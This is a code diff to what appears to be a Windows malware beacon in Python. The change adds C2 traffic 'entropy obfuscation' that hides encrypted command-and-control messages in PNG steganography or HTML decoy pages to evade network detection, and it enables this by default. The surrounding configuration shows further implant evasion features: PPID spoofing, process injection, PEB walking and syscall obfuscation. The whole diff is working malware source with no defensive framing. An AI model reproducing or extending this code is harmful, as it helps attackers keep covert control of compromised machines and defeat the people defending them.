@@ -37,6 +37,13 @@ except ImportError:
 # Add parent directory for imports
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+try:
+    from evasion.c2_traffic_entropy import C2TrafficEntropy
+    C2_TRAFFIC_ENTROPY_AVAILABLE = True
+except ImportError:
+    C2_TRAFFIC_ENTROPY_AVAILABLE = False
+    C2TrafficEntropy = None
+
 # Import evasion modules
 try:
     from evasion.sleep_obfuscation import SleepObfuscator, STEALTHY_PROFILE
@@ -414,6 +421,17 @@ class WinHTTPNetworkStack:
         self._session = None
         self._peb_finder = None
         self._manual_api_cache: Dict[str, int] = {}
+        self._entropy: Any = None
+
+        # NEW: C2 traffic entropy obfuscation (stego/decoy carriers)
+        if C2_TRAFFIC_ENTROPY_AVAILABLE and C2TrafficEntropy is not None and beacon_config is not None:
+            try:
+                if getattr(beacon_config, "enable_traffic_entropy", False):
+                    self._entropy = C2TrafficEntropy(
+                        beacon_id=getattr(beacon_config, "beacon_id", "") or ""
+                    )
+            except Exception:
+                self._entropy = None
 
         if PEB_WALKER_AVAILABLE:
             try:
@@ -467,12 +485,28 @@ class WinHTTPNetworkStack:
         if self.system != "Windows":
             raise RuntimeError("WinHTTPNetworkStack is Windows-only")
 
+        # NEW: Wrap already-encrypted body into a benign carrier to defeat
+        # entropy / ML traffic analysis (PNG stego or HTML decoy page).
+        content_type = headers.get("Content-Type", "text/html")
+        if self._entropy and body:
+            try:
+                body, content_type = self._entropy.embed(body, content_type)
+                headers["Content-Type"] = content_type
+            except Exception:
+                pass
+
         session = self._get_session()
         with session.connect(host, port) as h_connect:
             req = _WinHTTPRequest(h_connect, session._api)
             try:
                 req.open(method, path, use_ssl, headers, body)
-                return req.read()
+                response = req.read()
+                if self._entropy and response:
+                    try:
+                        return self._entropy.extract(response, content_type)
+                    except Exception:
+                        return response
+                return response
             finally:
                 req.close()
 
@@ -600,6 +634,8 @@ class BeaconConfig:
     enable_ppid_spoof: bool = True
     enable_mutation: bool = True
     injection_delay_ms: int = 2000
+    # NEW: C2 traffic entropy obfuscation (stego/decoy carriers)
+    enable_traffic_entropy: bool = True
     # NEW: Syscall obfuscation settings
     enable_syscall_obfuscation: bool = True
     syscall_obfuscation_layer: str = "full_monster"  # none, indirect_call, fresh_ssn, gan_mutate, full_monster
